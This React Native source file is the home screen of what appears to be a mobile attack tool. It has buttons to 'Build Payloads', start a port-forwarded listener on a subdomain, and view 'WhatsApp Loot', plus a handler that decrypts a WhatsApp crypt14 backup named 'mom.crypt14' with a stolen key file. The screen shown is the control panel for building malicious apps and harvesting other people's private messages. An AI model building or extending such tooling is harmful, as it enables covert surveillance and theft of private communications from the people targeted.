import React, { useEffect, useState } from "react";
import { 
    Box,
    StatusBar, 
    Icon,
    Button,
} from "native-base";
import nodejs from 'nodejs-mobile-react-native';
import MaterialCommunityIcons from 'react-native-vector-icons/MaterialCommunityIcons';
// redux
import { useDispatch, useSelector } from '../../redux/store';
import { setListening } from '../../redux/slices/userInfo'

// components
import ConnectingScreen from '../../components/ConnectingScreen'

// test
import RNFetchBlob from 'react-native-fetch-blob'
import AppBuilder from '../../native-modules/AppBuilder'

const Home = ({navigation}) => {
  const [visible, setVisible]= useState(false);
  const dispatch = useDispatch();
  const { subdomain, isListening } = useSelector((state) => state.userInfo);
  useEffect(()=>{
    nodejs.channel.addListener("log",(log) => console.log(log), this);
    nodejs.channel.addListener("listnerStarted", onlistnerStart, this);
  },[])


  const handleStartLister = ()=>{
      setVisible(true);
      nodejs.channel.post('startListener',subdomain)
  }
  const handleStopLister = ()=>{
    nodejs.channel.post('stopListener')
    dispatch(setListening(false))
  }
  const onlistnerStart = ()=>{
    dispatch(setListening(true))
    navigation.navigate('dashboard')
    setVisible(false);
  }
  const handleAppBuilder = ()=>{
    navigation.navigate('payloadBuilder')
  }

  const handleDecrypt =()=>{
    const dirs = RNFetchBlob.fs.dirs;
    var databaseFilename = dirs.SDCardDir +"/mom.crypt14";
    var keyFilename = dirs.SDCardDir +"/mom.key";
    AppBuilder.decrypt(databaseFilename, keyFilename,(d)=>console.log(d));
  }
  
  return (
    <>
    <StatusBar translucent backgroundColor={"transparent"} barStyle="light-content" />
    <Box  safeAreaTop bg={"primary"}/>

    <Box flex={1} justifyContent={"center"} bg={"primary"} px={'10'} >
    <Button variant={'subtle'} onPress={handleAppBuilder} colorScheme={'tertiary'} size={'lg'} borderRadius={16} mb={'10'} leftIcon={<Icon as={MaterialCommunityIcons} name="hammer-wrench" size="sm" />}>
     {'Build Payloads'}
    </Button>
    {!isListening?<Button onPress={handleStartLister} variant={'subtle'} colorScheme={'tertiary'} mb={'10'} size={'lg'} borderRadius={16} leftIcon={<Icon as={MaterialCommunityIcons} name="signal-variant" size="sm" />}>
     {'Start Listening'}
    </Button>:
    <Button onPress={handleStopLister} variant={'subtle'} colorScheme={'tertiary'} mb={'10'} size={'lg'} borderRadius={16} leftIcon={<Icon as={MaterialCommunityIcons} name="signal-variant" size="sm" />}>
     {'Stop Listening'}
    </Button>}
    <Button onPress={()=>navigation.navigate('loot')} variant={'subtle'} colorScheme={'tertiary'} size={'lg'} borderRadius={16} leftIcon={<Icon as={MaterialCommunityIcons} name="whatsapp" size="sm" />}>
     {'WhatsApp Loot'}
    </Button>
    </Box>
    <ConnectingScreen visible={visible} title={"Please wait, Forwarding port.."}/>
    </>
    )
};

export default Home;

  